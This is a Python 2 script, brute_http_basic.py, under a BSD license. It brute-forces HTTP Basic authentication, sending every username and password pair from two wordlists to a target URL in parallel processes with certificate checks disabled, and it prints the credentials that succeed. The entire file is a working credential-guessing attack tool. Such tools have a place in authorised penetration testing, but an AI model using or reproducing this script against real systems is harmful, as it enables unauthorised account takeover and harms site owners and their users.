# Copyright (c) 2013, AverageSecurityGuy
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
#   Redistributions of source code must retain the above copyright notice,
#   this list of conditions and the following disclaimer.
#
#   Redistributions in binary form must reproduce the above copyright notice,
#   this list of conditions and the following disclaimer in the documentation
#   and/or other materials provided with the distribution.
#
#   Neither the name of AverageSecurityGuy nor the names of its contributors
#   may be used to endorse or promote products derived from this software
#   without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.

import requests
import multiprocessing
import sys
import Queue


def worker(url, cred_queue, success_queue):
    print '[*] Starting new worker thread.'
    while True:
        # If there are no creds to test, stop the thread
        try:
            creds = cred_queue.get(timeout=10)
        except Queue.Empty:
            print '[-] Credential queue is empty, quitting.'
            return

        # If there are good creds in the queue, stop the thread
        if not success_queue.empty():
            print '[-] Success queue has credentials, quitting'
            return

        # Check a set of creds. If successful add them to the success_queue
        # and stop the thread.
        auth = requests.auth.HTTPBasicAuth(creds[0], creds[1])
        try:
            resp = requests.get(url, auth=auth, verify=False)

        except UnicodeDecodeError:
            continue

        except requests.exceptions.ConnectionError:
            print '[-] Connection error'
            cred_queue.put(creds)
            continue

        if resp.status_code == 401:
            print '[-] Failure: {0}/{1}'.format(creds[0], creds[1])
        else:
            print '[+] Success: {0}/{1}'.format(creds[0], creds[1])
            success_queue.put(creds)
            return


if __name__ == '__main__':
    if len(sys.argv) != 4:
        print 'USAGE: brute_http_basic.py url userfile passfile'
        sys.exit()

    cred_queue = multiprocessing.Queue()
    success_queue = multiprocessing.Queue()
    procs = []

    # Create one thread for each processor.
    for i in range(multiprocessing.cpu_count()):
        p = multiprocessing.Process(target=worker, args=(sys.argv[1],
                                                         cred_queue,
                                                         success_queue))
        procs.append(p)
        p.start()

    for user in open(sys.argv[2]):
        user = user.rstrip('\r\n')
        if user == '':
            continue
        for pwd in open(sys.argv[3]):
            pwd = pwd.rstrip('\r\n')
            cred_queue.put((user, pwd))

    # Wait for all worker processes to finish
    for p in procs:
        p.join()

    while not success_queue.empty():
        user, pwd = success_queue.get()
        print 'User: {0} Pass: {1}'.format(user, pwd)

